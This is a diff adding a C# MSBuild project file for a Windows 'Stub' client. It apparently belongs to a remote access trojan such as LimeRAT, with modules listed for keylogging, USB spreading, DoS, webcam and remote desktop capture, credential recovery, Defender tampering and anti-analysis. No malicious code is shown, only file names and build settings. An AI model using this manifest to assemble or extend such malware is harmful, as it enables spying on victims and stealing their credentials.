@@ -1,0 +1,176 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{C3C49F45-2589-4E04-9C50-71B6035C14AE}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Client</RootNamespace>
+    <AssemblyName>Stub</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <TargetFrameworkProfile>Client</TargetFrameworkProfile>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\Binaries\Debug\Stub\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <DocumentationFile>
+    </DocumentationFile>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <GenerateSerializationAssemblies>Auto</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>..\Binaries\Release\Stub\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <GenerateSerializationAssemblies>Auto</GenerateSerializationAssemblies>
+    <DebugSymbols>false</DebugSymbols>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject />
+  </PropertyGroup>
+  <PropertyGroup />
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.XML" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="AForge\Video.DirectShow\CameraControlProperty.cs" />
+    <Compile Include="AForge\Video.DirectShow\FilterInfo.cs" />
+    <Compile Include="AForge\Video.DirectShow\FilterInfoCollection.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IAMCameraControl.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IAMCrossbar.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IAMStreamConfig.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IAMVideoControl.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IBaseFilter.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\ICaptureGraphBuilder2.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\ICreateDevEnum.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IEnumFilters.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IEnumPins.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IFilterGraph.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IFilterGraph2.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IGraphBuilder.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IMediaControl.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IMediaEventEx.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IPin.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IPropertyBag.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\IReferenceClock.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\ISampleGrabber.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\ISampleGrabberCB.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\ISpecifyPropertyPages.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\Structures.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\Uuids.cs" />
+    <Compile Include="AForge\Video.DirectShow\Internals\Win32.cs" />
+    <Compile Include="AForge\Video.DirectShow\PhysicalConnectorType.cs" />
+    <Compile Include="AForge\Video.DirectShow\Uuids.cs" />
+    <Compile Include="AForge\Video.DirectShow\VideoCapabilities.cs" />
+    <Compile Include="AForge\Video.DirectShow\VideoCaptureDevice.cs" />
+    <Compile Include="AForge\Video.DirectShow\VideoInput.cs" />
+    <Compile Include="AForge\Video\IVideoSource.cs" />
+    <Compile Include="AForge\Video\VideoEvents.cs" />
+    <Compile Include="Algorithm\Aes256.cs" />
+    <Compile Include="Algorithm\Sha256.cs" />
+    <Compile Include="Handle Packet\HandleBlankScreen.cs" />
+    <Compile Include="Handle Packet\HandleBotKiller.cs" />
+    <Compile Include="Handle Packet\HandleDos.cs" />
+    <Compile Include="Handle Packet\HandleFileManager.cs" />
+    <Compile Include="Handle Packet\HandleRemoteDesktop.cs" />
+    <Compile Include="Handle Packet\HandlerExecuteDotNetCode.cs" />
+    <Compile Include="Handle Packet\HandleThumbnails.cs" />
+    <Compile Include="Handle Packet\HandlePcOptions.cs" />
+    <Compile Include="Handle Packet\HandlerChat.cs" />
+    <Compile Include="Handle Packet\HandleReportWindow.cs" />
+    <Compile Include="Handle Packet\HandlerRecovery.cs" />
+    <Compile Include="Handle Packet\HandleShell.cs" />
+    <Compile Include="Handle Packet\HandleTorrent.cs" />
+    <Compile Include="Handle Packet\HandleUAC.cs" />
+    <Compile Include="Handle Packet\HandleUninstall.cs" />
+    <Compile Include="Handle Packet\HandleWebcam.cs" />
+    <Compile Include="Handle Packet\HandleWindowsDefender.cs" />
+    <Compile Include="Handle Packet\Packet.cs" />
+    <Compile Include="Handle Packet\HandleLimeLogger.cs" />
+    <Compile Include="Handle Packet\HandleProcessManager.cs" />
+    <Compile Include="Handle Packet\HandleSendTo.cs" />
+    <Compile Include="Handle Packet\HandleLimeUSB.cs" />
+    <Compile Include="Helper\Anti_Analysis.cs" />
+    <Compile Include="Helper\FormChat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Helper\FormChat.Designer.cs">
+      <DependentUpon>FormChat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Helper\Methods.cs" />
+    <Compile Include="Helper\ProcessCritical.cs" />
+    <Compile Include="Install\NormalStartup.cs" />
+    <Compile Include="MessagePack\BytesTools.cs" />
+    <Compile Include="MessagePack\MsgPack.cs" />
+    <Compile Include="MessagePack\MsgPackType.cs" />
+    <Compile Include="MessagePack\ReadTools.cs" />
+    <Compile Include="MessagePack\WriteTools.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Settings.cs" />
+    <Compile Include="Connection\ClientSocket.cs" />
+    <Compile Include="Connection\TempSocket.cs" />
+    <Compile Include="StreamLibrary\Enums.cs" />
+    <Compile Include="StreamLibrary\IUnsafeCodec.cs" />
+    <Compile Include="StreamLibrary\IVideoCodec.cs" />
+    <Compile Include="StreamLibrary\src\JpgCompression.cs" />
+    <Compile Include="StreamLibrary\src\LzwCompression.cs" />
+    <Compile Include="StreamLibrary\src\NativeMethods.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Helper\FormChat.resx">
+      <DependentUpon>FormChat.cs</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
